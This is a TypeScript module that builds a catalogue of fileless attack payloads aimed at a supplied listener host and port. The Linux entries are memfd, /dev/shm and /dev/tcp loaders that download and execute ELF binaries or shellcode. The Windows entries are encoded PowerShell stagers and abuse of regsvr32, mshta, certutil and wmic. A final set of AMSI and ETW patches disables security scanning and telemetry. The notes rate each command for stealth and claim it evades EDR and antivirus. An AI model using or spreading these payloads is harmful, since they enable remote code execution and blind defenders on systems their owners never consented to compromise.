export interface ShadowPayload {
  id:       string;
  name:     string;
  category: string;
  os:       "linux" | "windows" | "any";
  stealth:  1 | 2 | 3 | 4 | 5;
  requires: string[];
  command:  string;
  notes:    string;
}

export function buildLinuxFilelessLoaders(lhost: string, lport: string): ShadowPayload[] {
  return [
    {
      id:"memfd_python_elf", name:"memfd_create ELF loader (Python)", category:"Fileless-Linux",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,urllib.request,os,sys
libc=ctypes.CDLL(None)
memfd_create=libc.memfd_create
memfd_create.restype=ctypes.c_int
memfd_create.argtypes=[ctypes.c_char_p,ctypes.c_uint]
fd=memfd_create(b'kworker',1)
if fd<0:sys.exit(1)
try:
  elf=urllib.request.urlopen('http://${lhost}:${lport}/elf',timeout=10).read()
  os.write(fd,elf)
  os.execv(f'/proc/{os.getpid()}/fd/{fd}',['kworker/0:0'])
except Exception as e:
  os.close(fd)
" 2>/dev/null &`,
      notes:"Linux memfd_create syscall loads ELF into anonymous RAM fd. Zero disk writes. Invisible to ls/find. Process appears as kworker in ps.",
    },
    {
      id:"memfd_perl_elf", name:"memfd_create ELF loader (Perl syscall)", category:"Fileless-Linux",
      os:"linux", stealth:5, requires:["perl"],
      command:`perl -e '
use POSIX;
$fd=syscall(319,"kw",1);
open my$f,">&=",$fd;
binmode $f;
$url="http://${lhost}:${lport}/elf";
open(my$h,"-|","curl -sk $url 2>/dev/null") or die;
local$/;
print$f <$h>;
close$h;close$f;
exec{"/proc/self/fd/$fd"}("kworker/0:2")
' 2>/dev/null &`,
      notes:"Perl syscall(319) = memfd_create on x86_64 Linux. Downloads and executes ELF from RAM only.",
    },
    {
      id:"devshm_exec", name:"/dev/shm volatile exec (no swap)", category:"Fileless-Linux",
      os:"linux", stealth:4, requires:["curl"],
      command:`_F=$(mktemp -p /dev/shm 2>/dev/null || mktemp -p /run/shm 2>/dev/null || echo /tmp/.kw$$); curl -fsSk "http://${lhost}:${lport}/elf" -o "$_F" 2>/dev/null && chmod +x "$_F" && "$_F" "$@" 2>/dev/null; rm -f "$_F" 2>/dev/null &`,
      notes:"/dev/shm is a tmpfs — lives in RAM, not written to disk swap. Cleaned on reboot. Deleted immediately after exec.",
    },
    {
      id:"proc_self_fd_bash", name:"/proc/self/fd + bash /dev/tcp loader", category:"Fileless-Linux",
      os:"linux", stealth:5, requires:["bash"],
      command:`exec 7<>/dev/tcp/${lhost}/${lport} 2>/dev/null; printf 'GET /sh HTTP/1.0\r\nHost: ${lhost}\r\n\r\n' >&7; tail -c +200 <&7 | bash 2>/dev/null &`,
      notes:"Pure bash, zero external tools. /dev/tcp opens TCP socket, tail strips HTTP headers, bash executes body. No fork exec visible.",
    },
    {
      id:"python_ctypes_shellcode", name:"Python ctypes mmap shellcode exec", category:"Shellcode",
      os:"linux", stealth:5, requires:["python3"],
      command:`python3 -c "
import ctypes,mmap,urllib.request,sys
sc=urllib.request.urlopen('http://${lhost}:${lport}/sc.bin',timeout=8).read()
mm=mmap.mmap(-1,len(sc),prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
mm.write(sc)
mm.seek(0)
ct=ctypes.CFUNCTYPE(ctypes.c_void_p)
fn=ct(ctypes.c_long(mm.tell()))
mm.seek(0)
addr=ctypes.addressof(ctypes.c_char.from_buffer(mm))
fn2=ct(addr)
fn2()
" 2>/dev/null`,
      notes:"Downloads raw shellcode, maps RWX mmap region, calls shellcode directly via ctypes function pointer. No disk writes.",
    },
    {
      id:"ld_preload_memfd", name:"LD_PRELOAD shared lib via memfd", category:"Injection",
      os:"linux", stealth:5, requires:["python3","gcc"],
      command:`python3 -c "
import ctypes,os,urllib.request,subprocess,tempfile
libc=ctypes.CDLL(None)
fd=libc.memfd_create(b'libsvc',1)
so=urllib.request.urlopen('http://${lhost}:${lport}/lib.so',timeout=8).read()
os.write(fd,so)
path=f'/proc/{os.getpid()}/fd/{fd}'
env=dict(os.environ,LD_PRELOAD=path)
subprocess.Popen(['/bin/ls'],env=env)
" 2>/dev/null`,
      notes:"Loads shared library from memfd — LD_PRELOAD path points to /proc/self/fd/N which is in RAM. Never touches disk.",
    },
  ];
}

export function buildWindowsInMemoryLoaders(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:${lport}`;
  const httpsUrl = `https://${lhost}:${lport}`;
  const b64iex = (s: string) => Buffer.from(s, "utf16le").toString("base64");

  const asmLoad = `$a=[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('${url}/payload.dll'));$a.GetType('NX.Run').GetMethod('Main').Invoke($null,$null)`;
  const asmLoadEnc = b64iex(asmLoad);

  const hollowPs = `$pi=New-Object System.Diagnostics.ProcessStartInfo('svchost.exe');$pi.UseShellExecute=$false;$pi.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($pi);$h=$p.Handle;$buf=(New-Object Net.WebClient).DownloadData('${url}/sc.bin');$ptr=[Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length);[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,$buf.Length);$o=0;[System.Runtime.InteropServices.Marshal]::WriteIntPtr([IntPtr]($p.MainModule.BaseAddress.ToInt64()+0x18),$ptr)`;
  const hollowEnc = b64iex(hollowPs);

  const donutLoad = `$sc=(New-Object Net.WebClient).DownloadData('${url}/donut.bin');$mm=[Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length);[Runtime.InteropServices.Marshal]::Copy($sc,0,$mm,$sc.Length);$vp=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type -MemberDefinition '[DllImport(\"kernel32\")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' -Name K32 -PassThru)::VirtualAlloc([IntPtr]::Zero,[uint]$sc.Length,0x3000,0x40),[System.Func[System.IntPtr]]);`;

  return [
    {
      id:"win_assembly_load", name:".NET Assembly.Load() in-memory", category:"Fileless-Windows",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${asmLoadEnc}`,
      notes:".NET Assembly.Load() from byte array — PE never touches disk. EDR sees a legitimate .NET process loading assembly from memory.",
    },
    {
      id:"win_iex_download", name:"IEX in-memory PS script (encoded)", category:"Fileless-Windows",
      os:"windows", stealth:4, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -enc ${b64iex(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)}`,
      notes:"Classic fileless IEX — downloads PS script into memory, executes without writing to disk. Use AMSI bypass as pre-stage.",
    },
    {
      id:"win_xor_loader", name:"XOR-encrypted in-memory PS loader", category:"Fileless-Windows",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "$k=0x4e;$b=(New-Object Net.WebClient).DownloadData('${url}/xor.bin');$d=@();for($i=0;$i -lt $b.Count;$i++){$d+=$b[$i] -bxor $k};IEX([Text.Encoding]::Unicode.GetString($d))"`,
      notes:"Downloads XOR-encrypted payload, decodes in memory, IEX executes. Single-byte XOR key 0x4e='N'. Evades static AV signatures.",
    },
    {
      id:"win_add_type_shellcode", name:"Add-Type VirtualAlloc shellcode exec", category:"Shellcode",
      os:"windows", stealth:4, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NX{[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr p,IntPtr l,uint f,IntPtr i);[DllImport(\"kernel32\")]public static extern int WaitForSingleObject(IntPtr h,int ms);}'; $sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin'); $m=[NX]::VirtualAlloc([IntPtr]::Zero,[uint]$sc.Length,0x3000,0x40); [Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length); $t=[NX]::CreateThread([IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[IntPtr]::Zero); [NX]::WaitForSingleObject($t,-1)"`,
      notes:"P/Invoke VirtualAlloc+CreateThread — allocates RWX memory, copies shellcode, creates thread. Classic but effective.",
    },
    {
      id:"win_com_scriptlet", name:"COM Scriptlet in-memory execution", category:"LOLBAS",
      os:"windows", stealth:4, requires:[],
      command:`regsvr32 /s /n /u /i:${url}/payload.sct scrobj.dll`,
      notes:"Regsvr32 Squiblydoo — downloads COM scriptlet from URL and executes. Bypasses AppLocker. Leaves no artifacts beyond event logs.",
    },
    {
      id:"win_mshta_vbs", name:"MSHTA VBScript in-memory exec", category:"LOLBAS",
      os:"windows", stealth:4, requires:[],
      command:`mshta vbscript:Execute("Set o=CreateObject(""WScript.Shell""):o.Run""powershell -NonI -W Hidden -Exec Bypass -enc ${b64iex(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)} "",0,True:close")`,
      notes:"MSHTA executes VBScript that launches PowerShell — double-hop evades many script monitoring solutions.",
    },
    {
      id:"win_certutil_decode", name:"CertUtil base64 decode + exec", category:"LOLBAS",
      os:"windows", stealth:3, requires:[],
      command:`certutil -urlcache -split -f ${url}/payload.b64 %TEMP%\\_nx.b64 && certutil -decode %TEMP%\\_nx.b64 %TEMP%\\_nx.exe && %TEMP%\\_nx.exe && del %TEMP%\\_nx.b64 %TEMP%\\_nx.exe`,
      notes:"certutil is a signed Microsoft binary — often allowed by AppLocker. Downloads base64-encoded PE, decodes, and executes.",
    },
    {
      id:"win_wmic_spawn", name:"WMIC process create (bypass AV hook)", category:"LOLBAS",
      os:"windows", stealth:4, requires:[],
      command:`wmic process call create "powershell -NonI -W Hidden -Exec Bypass -enc ${b64iex(`IEX((New-Object Net.WebClient).DownloadString('${url}/stager.ps1'))`)}"`,
      notes:"WMIC spawns process via WMI — parent process is WmiPrvSE.exe instead of cmd.exe. Breaks some EDR parent-process chains.",
    },
  ];
}

export function buildAmsiBypassChains(lhost: string, lport: string): ShadowPayload[] {
  const url = `http://${lhost}:${lport}`;
  return [
    {
      id:"amsi_patch_reflection", name:"AMSI amsiInitFailed reflection patch", category:"AMSI-Bypass",
      os:"windows", stealth:4, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX((New-Object Net.WebClient).DownloadString('${url}/payload.ps1'))"`,
      notes:"Sets amsiInitFailed=true via reflection — AMSI reports init failure, skips all scanning. Works on unpatched PS 5.1.",
    },
    {
      id:"amsi_patch_vprotect", name:"AMSI AmsiScanBuffer VirtualProtect patch", category:"AMSI-Bypass",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxA{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string l);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void Patch(){uint o;var h=LoadLibrary(\"am\"+\"si.dll\");var f=GetProcAddress(h,\"Amsi\"+\"ScanBuffer\");VirtualProtect(f,(UIntPtr)5,0x40,out o);Marshal.Copy(new byte[]{0x31,0xC0,0xC3,0x90,0x90},0,f,5);}}';[NxA]::Patch();IEX((New-Object Net.WebClient).DownloadString('${url}/payload.ps1'))"`,
      notes:"Patches AmsiScanBuffer to return XOR EAX,EAX;RET — all scans return AMSI_RESULT_CLEAN. Works on any PS version with no AMSI updates.",
    },
    {
      id:"amsi_com_bypass", name:"AMSI PS v2 downgrade bypass", category:"AMSI-Bypass",
      os:"windows", stealth:3, requires:[],
      command:`powershell -Version 2 -NoProfile -ExecutionPolicy Bypass -c "IEX((New-Object Net.WebClient).DownloadString('${url}/payload.ps1'))"`,
      notes:"PS 2.0 has no AMSI. Requires .NET 2.0 to be installed. Simple but may be blocked by newer Windows versions.",
    },
    {
      id:"etw_patch", name:"ETW EtwEventWrite patch (disable telemetry)", category:"ETW-Bypass",
      os:"windows", stealth:5, requires:["powershell"],
      command:`powershell -NonI -W Hidden -Exec Bypass -c "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class NxE{[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport(\"ntdll\")]public static extern IntPtr NtOpenSection(ref IntPtr h,uint ac,IntPtr oa);[DllImport(\"kernel32\")]public static extern IntPtr LoadLibrary(string n);[DllImport(\"kernel32\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);public static void Go(){uint o;var h=LoadLibrary(\"ntdll\");var f=GetProcAddress(h,\"EtwEventWrite\");VirtualProtect(f,(UIntPtr)1,0x40,out o);System.Runtime.InteropServices.Marshal.WriteByte(f,0xC3);VirtualProtect(f,(UIntPtr)1,o,out o);}}';[NxE]::Go()"`,
      notes:"Patches EtwEventWrite in ntdll to RET immediately — disables all Windows ETW telemetry for the current process. Blinds Microsoft Defender ATP.",
    },
  ];
}

export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayload[] {
  return [
    ...buildLinuxFilelessLoaders(lhost, lport),
    ...buildWindowsInMemoryLoaders(lhost, lport),
    ...buildAmsiBypassChains(lhost, lport),
  ];
}
